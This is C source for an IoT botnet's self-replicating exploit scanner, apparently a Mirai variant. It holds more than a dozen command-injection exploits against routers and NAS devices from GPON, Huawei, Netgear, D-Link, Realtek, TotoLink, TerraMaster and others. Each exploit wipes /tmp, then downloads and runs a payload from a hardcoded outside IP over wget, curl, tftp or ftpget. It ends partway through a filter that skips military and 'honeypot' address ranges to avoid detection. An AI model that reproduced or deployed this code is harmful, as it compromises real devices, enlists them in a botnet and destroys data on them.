//#ifdef SELFREP
#define _GNU_SOURCE
//BY ROOTSEC
#ifdef DEBUG
    #include <stdio.h>
#endif

#include <stdlib.h> 
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"
#include "scanner.h"
//13 EXPLOIT SELFREP SCANNER
int GPON1_Range [] = {187,189,200,201,207};
int GPON2_Range [] = {1,2,5,31,37,41,42,58,62,78,82,84,88,89,91,92,95,103,113,118,145,147,178,183,185,195,210,212};
//int NETIS_Range [] = {1,14,27,36,39,40,42,47,49,58,59,60,61,62,94,101,103,104,106,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,139,140,144,150,153,163,171,175,180,182,183,193,202,203,210,211,216,218,219,220,221,222,223};

int scanner_pid, 
	scanner2_pid, 
	scanner3_pid, 
	scanner4_pid, 
	scanner5_pid, 
	scanner6_pid, 
	scanner7_pid, 
	scanner8_pid, 
	scanner9_pid, 
	scanner10_pid, 
	scanner11_pid, 
	scanner12_pid, 
	scanner13_pid, 
	scanner14_pid, 
	scanner15_pid, 
	timeout = 100000;
static uint8_t ipState[40] = {0};
int max = 0, i = 0;

int socket_connect_tcp(char *host, in_port_t port) // tcp socket for sending POST/GET requests
{	
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
    struct timeval timeout;     
    timeout.tv_sec = 3; // 3 sec timeout on socket
    timeout.tv_usec = 0;
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}

int socket_connect_udp(char *host, in_port_t port) // udp socket for netis explotation
{	
}

void exploit_socket_gpon8080(unsigned char *host)
{
    scanner3_pid = fork();
	
    if (scanner3_pid > 0 || scanner3_pid == -1)
        return;	

	int gpon_socket1;
	char gpon_request1[1024];
	
	gpon_socket1 = socket_connect_tcp((char *)host, 8080);
	
	sprintf(gpon_request1, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nContent-Length: 118\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://77.68.125.237/data/kpop+-O+->/tmp/kpop;sh+/tmp/kpop&ipv=0");
	
	if (gpon_socket1 != 0) 
	{
		write(gpon_socket1, gpon_request1, strlen(gpon_request1));
		usleep(200000);
		close(gpon_socket1);
		#ifdef DEBUG
			printf("[gpon_8080] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_gpon80(unsigned char *host)
{
    scanner4_pid = fork();
	
    if (scanner4_pid > 0 || scanner4_pid == -1)
        return;	

	int gpon_socket2;
	char gpon_request2[1024];
	
	gpon_socket2 = socket_connect_tcp((char *)host, 80);
	
	sprintf(gpon_request2, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: B4ckdoor-owned-you\r\nContent-Length: 118\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://77.68.125.237/data/kpop+-O+->/tmp/kpop;sh+/tmp/kpop&ipv=0");
	
	if (gpon_socket2 != 0) 
	{
		write(gpon_socket2, gpon_request2, strlen(gpon_request2));
		usleep(200000);
		close(gpon_socket2);
		#ifdef DEBUG
			printf("[gpon_80] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_realtek(unsigned char *host)
{
    scanner5_pid = fork();
	
    if (scanner5_pid > 0 || scanner5_pid == -1)
        return;	

	int realtek_socket;
	char realtek_request[1024], realtek_request2[1024];
	
	realtek_socket = socket_connect_tcp((char *)host, 52869);
	
	sprintf(realtek_request, "POST /picsdesc.xml HTTP/1.1\r\nHost: %s:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: B4ckdoor-owned-you\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf*; wget http://77.68.125.237/data/kpop`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", host);
	sprintf(realtek_request2, "POST /picsdesc.xml HTTP/1.1\r\nHost: %s:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: B4ckdoor-owned-you\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x kpop;./kpop`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", host);
	
	if (realtek_socket != 0) 
	{
		write(realtek_socket, realtek_request, strlen(realtek_request));
		sleep(5);
		write(realtek_socket, realtek_request2, strlen(realtek_request2));
		usleep(200000);
		close(realtek_socket);
		#ifdef DEBUG
			printf("[realtek] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_netgear(unsigned char *host)
{
    scanner6_pid = fork();
	
    if (scanner6_pid > 0 || scanner6_pid == -1)
        return;	

	int netgear_socket, netgear_socket2;
	char netgear_request[1024];
	
	netgear_socket = socket_connect_tcp((char *)host, 8080);
	netgear_socket2 = socket_connect_tcp((char *)host, 80);
	
	sprintf(netgear_request, "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://77.68.125.237/data/kpop+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n");

	if (netgear_socket != 0) 
	{
		write(netgear_socket, netgear_request, strlen(netgear_request));
		usleep(200000);
		close(netgear_socket);
		#ifdef DEBUG
			printf("[netgear_8080] exploitable %s\n", host);
		#endif
	}
	if (netgear_socket2 != 0) 
	{
		write(netgear_socket2, netgear_request, strlen(netgear_request));
		usleep(200000);
		close(netgear_socket2);
		#ifdef DEBUG
			printf("[netgear_80] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_huawei(unsigned char *host)
{
    scanner6_pid = fork();
	
    if (scanner6_pid > 0 || scanner6_pid == -1)
        return;	

	int huawei_socket;
	char huawei_request[1024];
	
	huawei_socket = socket_connect_tcp((char *)host, 37215);
	
	sprintf(huawei_request, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %s:37215\r\nContent-Length: 601\r\nConnection: keep-alive\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g http://77.68.125.237/data/kpop -l /tmp/kpop -r /kpop; sh /tmp/kpop)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>", host);
	
	if (huawei_socket != 0) 
	{
		write(huawei_socket, huawei_request, strlen(huawei_request));
		usleep(200000);
		close(huawei_socket);
		#ifdef DEBUG
			printf("[huawei] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_tr064(unsigned char *host)
{
    scanner7_pid = fork();
	
    if (scanner7_pid > 0 || scanner7_pid == -1)
        return;	

	int tr064_socket, tr064_socket2;
	char tr064_request[1024], tr064_request2[1024];
	
	tr064_socket = socket_connect_tcp((char *)host, 7574);
	tr064_socket2 = socket_connect_tcp((char *)host, 5555);
	
	sprintf(tr064_request, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:7574\r\nUser-Agent: B4ckdoor-owned-you\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://77.68.125.237/data/kpop && sh /tmp/kpop`</NewNTPServer1><NewNTPServer2>`echo OMNI`</NewNTPServer2><NewNTPServer3>`echo OMNI`</NewNTPServer3><NewNTPServer4>`echo OMNI`</NewNTPServer4><NewNTPServer5>`echo OMNI`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>", host);
	sprintf(tr064_request2, "POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:5555\r\nUser-Agent: B4ckdoor-owned-you\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://77.68.125.237/data/kpop && sh /tmp/kpop`</NewNTPServer1><NewNTPServer2>`echo OMNI`</NewNTPServer2><NewNTPServer3>`echo OMNI`</NewNTPServer3><NewNTPServer4>`echo OMNI`</NewNTPServer4><NewNTPServer5>`echo OMNI`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>", host);
	
	if (tr064_socket != 0) 
	{
		write(tr064_socket, tr064_request, strlen(tr064_request));
		usleep(200000);
		close(tr064_socket);
		#ifdef DEBUG
			printf("[tr064_7574] exploitable %s\n", host);
		#endif
	}
	if (tr064_socket2 != 0) 
	{
		write(tr064_socket2, tr064_request2, strlen(tr064_request2));
		usleep(200000);
		close(tr064_socket2);
		#ifdef DEBUG
			printf("[tr064_5555] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_hnap(unsigned char *host)
{
    scanner8_pid = fork();
	
    if (scanner8_pid > 0 || scanner8_pid == -1)
        return;	

	int hnap_socket;
	char hnap_request[1024];
	
	hnap_socket = socket_connect_tcp((char *)host, 80);
	
	sprintf(hnap_request, "POST /HNAP1/ HTTP/1.0\r\nHost: %s:80\r\nContent-Type: text/xml; charset=\"utf-8\"\r\nSOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://77.68.125.237/data/kpop && sh /tmp/kpop`\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>\r\n\r\n", host);

	if (hnap_socket != 0) 
	{
		write(hnap_socket, hnap_request, strlen(hnap_request));
		usleep(200000);
		close(hnap_socket);
		#ifdef DEBUG
			printf("[hnap] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_crossweb(unsigned char *host)
{
    scanner9_pid = fork();
	
    if (scanner9_pid > 0 || scanner9_pid == -1)
        return;	

	int crossweb_socket;
	char crossweb_request[1024];
	
	crossweb_socket = socket_connect_tcp((char *)host, 81);
	
	sprintf(crossweb_request, "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://77.68.125.237/data/kpop;sh${IFS}/tmp/kpop&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n");

	if (crossweb_socket != 0) 
	{
		write(crossweb_socket, crossweb_request, strlen(crossweb_request));
		usleep(200000);
		close(crossweb_socket);
		#ifdef DEBUG
			printf("[crossweb] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_jaws(unsigned char *host)
{
    scanner10_pid = fork();
	
    if (scanner10_pid > 0 || scanner10_pid == -1)
        return;	

	int jaws_socket;
	char jaws_request[1024];
	
	jaws_socket = socket_connect_tcp((char *)host, 80);
	
	sprintf(jaws_request, "GET /shell?cd+/tmp;rm+-rf+*;wget+http://77.68.125.237/data/kpop;sh+/tmp/kpop HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: %s:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n", host);

	if (jaws_socket != 0) 
	{
		write(jaws_socket, jaws_request, strlen(jaws_request));
		usleep(200000);
		close(jaws_socket);
		#ifdef DEBUG
			printf("[jaws] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_dlink(unsigned char *host)
{
    scanner11_pid = fork();
	
    if (scanner11_pid > 0 || scanner11_pid == -1)
        return;	

	int dlink_socket;
	char dlink_request[1024];
	
	dlink_socket = socket_connect_tcp((char *)host, 49152);
	
	sprintf(dlink_request, "POST /soap.cgi?service=WANIPConn1 HTTP/1.1\r\nHost: %s:49152\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://77.68.125.237/data/kpop;sh /tmp/kpop`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>\r\n\r\n", host);

	if (dlink_socket != 0) 
	{
		write(dlink_socket, dlink_request, strlen(dlink_request));
		usleep(200000);
		close(dlink_socket);
		#ifdef DEBUG
			printf("[dlink] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_r7064(unsigned char *host)
{
    scanner12_pid = fork();
	
    if (scanner12_pid > 0 || scanner12_pid == -1)
        return;	

	int r7064_socket;
	char r7064_request[1024];
	
	r7064_socket = socket_connect_tcp((char *)host, 8443);
	
	sprintf(r7064_request, "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://77.68.125.237/data/kpop;${IFS}sh${IFS}/var/tmp/kpop");

	if (r7064_socket != 0) 
	{
		write(r7064_socket, r7064_request, strlen(r7064_request));
		usleep(200000);
		close(r7064_socket);
		#ifdef DEBUG
			printf("[r7064] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_vacron(unsigned char *host)
{
    scanner13_pid = fork();
	
    if (scanner13_pid > 0 || scanner13_pid == -1)
        return;	

	int vacron_socket;
	char vacron_request[1024];
	
	vacron_socket = socket_connect_tcp((char *)host, 8080);
	
	sprintf(vacron_request, "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://77.68.125.237/data/kpop;sh+/tmp/kpop");

	if (vacron_socket != 0) 
	{
		write(vacron_socket, vacron_request, strlen(vacron_request));
		usleep(200000);
		close(vacron_socket);
		#ifdef DEBUG
			printf("[vacron] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_awsec2(unsigned char *host)
{
    scanner13_pid = fork();
	
    if (scanner13_pid > 0 || scanner13_pid == -1)
        return;	

	int awsec2_socket;
	char awsec2_request[1024];
	
	awsec2_socket = socket_connect_tcp((char *)host, 8080);
	
	sprintf(awsec2_request, "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://77.68.125.237/data/kpop;sh+/tmp/kpop");

	if (awsec2_socket != 0) 
	{
		write(awsec2_socket, awsec2_request, strlen(awsec2_request));
		usleep(200000);
		close(awsec2_socket);
		#ifdef DEBUG
			printf("[awsec2] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_totolinkN600R(unsigned char *host)
{
	scanner14_pid = fork();
	
    if (scanner14_pid > 0 || scanner14_pid == -1)
        return;	

	int toto_socket;
	char toto_request[1024];
	
	toto_socket = socket_connect_tcp((char *)host, 8080);
	
	sprintf(toto_request, "GET /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&command=;cd{IFS}/tmp{IFS}||{IFS}cd{IFS}/var/run{IFS}||{IFS}cd{IFS}/mnt{IFS}||{IFS}cd{IFS}/root{IFS}||{IFS}cd{IFS}/;{IFS}wget{IFS}http://77.68.125.237/8UsA.sh;{IFS}curl{IFS}-O{IFS}http://77.68.125.237/8UsA.sh;{IFS}chmod{IFS}777{IFS}8UsA.sh;{IFS}sh{IFS}8UsA.sh;{IFS}tftp{IFS}77.68.125.237{IFS}-c{IFS}get{IFS}t8UsA.sh;{IFS}chmod{IFS}777{IFS}t8UsA.sh;{IFS}sh{IFS}t8UsA.sh;{IFS}tftp{IFS}-r{IFS}t8UsA2.sh{IFS}-g{IFS}77.68.125.237;{IFS}chmod{IFS}777{IFS}t8UsA2.sh;{IFS}sh{IFS}t8UsA2.sh;{IFS}ftpget{IFS}-v{IFS}-u{IFS}anonymous{IFS}-p{IFS}anonymous{IFS}-P{IFS}21{IFS}77.68.125.237{IFS}8UsA1.sh{IFS}8UsA1.sh;{IFS}sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}8UsA.sh{IFS}t8UsA.sh{IFS}t8UsA2.sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}*;&filetype=gz");

	if (toto_socket != 0) 
	{
		write(toto_socket, toto_request, strlen(toto_request));
		sprintf(toto_request, "GET /cgi-bin/downloadFlile.cgi?payload=`cd{IFS}/tmp{IFS}||{IFS}cd{IFS}/var/run{IFS}||{IFS}cd{IFS}/mnt{IFS}||{IFS}cd{IFS}/root{IFS}||{IFS}cd{IFS}/;{IFS}wget{IFS}http://77.68.125.237/8UsA.sh;{IFS}curl{IFS}-O{IFS}http://77.68.125.237/8UsA.sh;{IFS}chmod{IFS}777{IFS}8UsA.sh;{IFS}sh{IFS}8UsA.sh;{IFS}tftp{IFS}77.68.125.237{IFS}-c{IFS}get{IFS}t8UsA.sh;{IFS}chmod{IFS}777{IFS}t8UsA.sh;{IFS}sh{IFS}t8UsA.sh;{IFS}tftp{IFS}-r{IFS}t8UsA2.sh{IFS}-g{IFS}77.68.125.237;{IFS}chmod{IFS}777{IFS}t8UsA2.sh;{IFS}sh{IFS}t8UsA2.sh;{IFS}ftpget{IFS}-v{IFS}-u{IFS}anonymous{IFS}-p{IFS}anonymous{IFS}-P{IFS}21{IFS}77.68.125.237{IFS}8UsA1.sh{IFS}8UsA1.sh;{IFS}sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}8UsA.sh{IFS}t8UsA.sh{IFS}t8UsA2.sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}*`");
		write(toto_socket, toto_request, strlen(toto_request));
		usleep(200000);
		close(toto_socket);
		#ifdef DEBUG
			printf("[totolink] exploitable %s\n", host);
		#endif
	}
	exit(0);
}

void exploit_socket_terramaster(unsigned char *host)
{
	scanner15_pid = fork();
	
    if (scanner15_pid > 0 || scanner15_pid == -1)
        return;	

	int terramaster_socket;
	char terramaster_request[1024];
	
	terramaster_socket = socket_connect_tcp((char *)host, 8081);
	
	sprintf(terramaster_request, "GET /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&command=;cd{IFS}/tmp{IFS}||{IFS}cd{IFS}/var/run{IFS}||{IFS}cd{IFS}/mnt{IFS}||{IFS}cd{IFS}/root{IFS}||{IFS}cd{IFS}/;{IFS}wget{IFS}http://77.68.125.237/8UsA.sh;{IFS}curl{IFS}-O{IFS}http://77.68.125.237/8UsA.sh;{IFS}chmod{IFS}777{IFS}8UsA.sh;{IFS}sh{IFS}8UsA.sh;{IFS}tftp{IFS}77.68.125.237{IFS}-c{IFS}get{IFS}t8UsA.sh;{IFS}chmod{IFS}777{IFS}t8UsA.sh;{IFS}sh{IFS}t8UsA.sh;{IFS}tftp{IFS}-r{IFS}t8UsA2.sh{IFS}-g{IFS}77.68.125.237;{IFS}chmod{IFS}777{IFS}t8UsA2.sh;{IFS}sh{IFS}t8UsA2.sh;{IFS}ftpget{IFS}-v{IFS}-u{IFS}anonymous{IFS}-p{IFS}anonymous{IFS}-P{IFS}21{IFS}77.68.125.237{IFS}8UsA1.sh{IFS}8UsA1.sh;{IFS}sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}8UsA.sh{IFS}t8UsA.sh{IFS}t8UsA2.sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}*;&filetype=gz");

	if (terramaster_socket != 0)
	{
		write(terramaster_socket, terramaster_request, strlen(terramaster_request));
		sprintf(terramaster_request, "GET /cgi-bin/downloadFlile.cgi?payload=`cd{IFS}/tmp{IFS}||{IFS}cd{IFS}/var/run{IFS}||{IFS}cd{IFS}/mnt{IFS}||{IFS}cd{IFS}/root{IFS}||{IFS}cd{IFS}/;{IFS}wget{IFS}http://77.68.125.237/8UsA.sh;{IFS}curl{IFS}-O{IFS}http://77.68.125.237/8UsA.sh;{IFS}chmod{IFS}777{IFS}8UsA.sh;{IFS}sh{IFS}8UsA.sh;{IFS}tftp{IFS}77.68.125.237{IFS}-c{IFS}get{IFS}t8UsA.sh;{IFS}chmod{IFS}777{IFS}t8UsA.sh;{IFS}sh{IFS}t8UsA.sh;{IFS}tftp{IFS}-r{IFS}t8UsA2.sh{IFS}-g{IFS}77.68.125.237;{IFS}chmod{IFS}777{IFS}t8UsA2.sh;{IFS}sh{IFS}t8UsA2.sh;{IFS}ftpget{IFS}-v{IFS}-u{IFS}anonymous{IFS}-p{IFS}anonymous{IFS}-P{IFS}21{IFS}77.68.125.237{IFS}8UsA1.sh{IFS}8UsA1.sh;{IFS}sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}8UsA.sh{IFS}t8UsA.sh{IFS}t8UsA2.sh{IFS}8UsA1.sh;{IFS}rm{IFS}-rf{IFS}*`");
		write(terramaster_socket, terramaster_request, strlen(terramaster_request));
		usleep(200000);
		close(terramaster_socket);
		#ifdef DEBUG
			printf("[terramaster] exploitable %s\n", host);
		#endif
	}
	else
	{

	}
	exit(0);
}

bool check_ip(uint8_t o1, uint8_t o2, uint8_t o3, uint8_t o4)
{
	if(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
    	(o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
    	(o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
    	(o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
    	(o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
    	(o1 == 10) ||                             // 10.0.0.0/8       - Internal network
    	(o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
    	(o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
    	(o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
    	(o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
    	(o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
    	(o1 >= 224) ||                            // 224.*.*.*+       - Multicast
    	(o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) || // Department of Defense
		//my honeypot checks:)
		(o1 == 6) || // : Aarmy Information Systems Center
		(o1 == 21) || // : US Defense Information Systems Agency
		(o1 == 22) || // : Defense Information Systems Agency
		(o1 == 24 && o2 == 8) || //) || // @Home, USA
		(o1 == 24 && o2 == 88) || //) || // [Roadrunner, USA
		(o1 == 24 && o2 == 112) || //) || // [@Home, Canada
		(o1 == 24 && o2 == 132) || //) || // [A2000) || //, Netherlands
		(o1 == 24 && o2 == 188) || // : Cablevisio Systems Corp (USA)
		(o1 == 26) || // : Defense Information Systems Agency
		(o1 == 29) || // : Defense Information Systems Agency
		(o1 == 30) || // : Defense Information Systems Agency
		(o1 == 49) || // : Joint Tactical Command
		(o1 == 50) || // : Joint Tactical Command
		(o1 == 53) || // DaimlerChrysler AG
		(o1 == 55) || // : Army National Guard Bureau
		(o1 == 62 && o2 >= 1 && o2 <= 30) ||
		(o1 == 62 && o2 == 52) || // : Commundo
		(o1 == 62 && o2 == 52) || // : Debitel
		(o1 == 62 && o2 == 62) || // : lahm (9) || // Online French)
		(o1 == 62 && o2 == 69 && o3 == 140) || // : AddCOM
		(o1 == 62 && o2 == 96) || // : I-net
		(o1 == 62 && o2 == 137) || // Freeserve, UK
		(o1 == 62 && o2 == 150) || // T-Online
		(o1 == 62 && o2 == 255) ||
		(o1 == 62 && o2 == 156) || // : Erotik-Welt
		(o1 == 62 && o2 == 157) || // : 1) || // & 1) || //
		(o1 == 62 && o2 == 158) || //) || // [T-Online, Germany
		(o1 == 62 && o2 == 180) || // : Planet Intercom
		(o1 == 64 && o2 == 9) || //) || // Adelphia, USA
		(o1 == 64 && o2 == 44) || //) || // Darwin Networks Community, USA
		(o1 == 64 && o2 == 224) || // : (FBI's honeypot)
		(o1 == 64 && o2 == 225) || // : (FBI's honeypot)
		(o1 == 64 && o2 == 226) || // : (FBI's honeypot)
		(o1 == 80) || // : lahm
		(o1 == 81) || // : lahm
		(o1 == 128 && o2 == 4) || // : University of Delaware
		(o1 == 128 && o2 == 8) || // : University of Maryland
		(o1 == 128 && o2 == 10) || // : Purdue University
		(o1 == 128 && o2 == 11 || o2 == 22) || // : Yahoo, Inc.) || //
		(o1 == 128 && o2 == 11 || o2 == 23) || // : Yahoo, Inc.) || //
		(o1 == 128 && o2 == 11 || o2 == 68) || // : Yahoo, Inc.) || // (NETBLK-FOUR11) || //DS559) || //-68) || //-19) || //)
		(o1 == 128 && o2 == 11 || o2 == 69) || // : Yahoo, Inc.) || // (NETBLK-FOUR11) || //DS216) || //-69) || //-19) || //)
		(o1 == 128 && o2 == 11 || o2 == 70) || // : Yahoo, Inc.) || // (NETBLK-FOUR11) || //DS698) || //-70) || //-19) || //)
		(o1 == 128 && o2 == 11 || o2 == 71) || // : Yahoo, Inc.) || // (NETBLK-FOUR11) || //DS699) || //-71) || //-20) || //)
		(o1 == 128 && o2 == 11 || o2 == 96) || // : FortuneCity Ltd.) || //
		(o1 == 128 && o2 == 36) || // Yale University (NET-YALE-NET)
		(o1 == 128 && o2 == 37) || // : Army Yuma Proving Ground
		(o1 == 128 && o2 == 38) || // Naval Surface Warfare Center (NET-NSWC-NET)
